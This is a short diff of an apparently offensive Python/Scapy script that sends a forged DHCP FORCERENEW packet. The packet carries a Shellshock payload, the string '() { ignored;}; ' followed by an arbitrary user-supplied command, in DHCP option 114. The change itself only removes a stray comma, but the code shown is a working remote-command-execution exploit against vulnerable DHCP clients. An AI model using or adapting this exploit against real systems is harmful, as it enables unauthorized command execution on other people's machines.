@@ -32,7 +32,7 @@ def main():
         IP(src=args.src_ip, dst=args.dst_ip)/
         UDP(sport=68,dport=67)/
         BOOTP(chaddr=args.src_mac)/
-        DHCP(options=[("message-type","force_renew"), (114, "() { ignored;}; " + args.command), ('end')]),iface=args.interface,)
+        DHCP(options=[("message-type","force_renew"), (114, "() { ignored;}; " + args.command), ('end')]),iface=args.interface)
 
 if __name__ == "__main__":
     main()
